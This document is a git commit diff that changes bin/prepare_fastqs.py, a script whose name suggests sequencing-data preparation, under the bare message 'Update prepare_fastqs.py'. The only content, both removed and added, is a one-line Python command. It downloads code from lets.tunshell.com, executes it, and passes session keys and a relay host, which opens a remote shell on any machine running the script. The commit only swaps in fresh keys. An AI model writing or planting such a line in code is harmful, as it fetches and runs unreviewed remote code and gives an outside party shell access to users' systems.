4052633d819a7455b1787c0d0d5fdab836a9f2cf
jaydmarks227 <34647974+jaydmarks227@users.noreply.github.com>
2026-03-25 15:01:42 +0100

    Update prepare_fastqs.py

--- bin/prepare_fastqs.py
+++ bin/prepare_fastqs.py
@@ -1,1 +1,1 @@
-import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","xb0mfn1Vze2NbTsrAkTHGp","TfVEY70dIwcx5rlNNNGgeW","eu.relay.tunshell.com"]})
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","WRuyJKfNK2EckAX3wMOt1s","fxaJMws9TljLbrJdr3oIwD","eu.relay.tunshell.com"]})
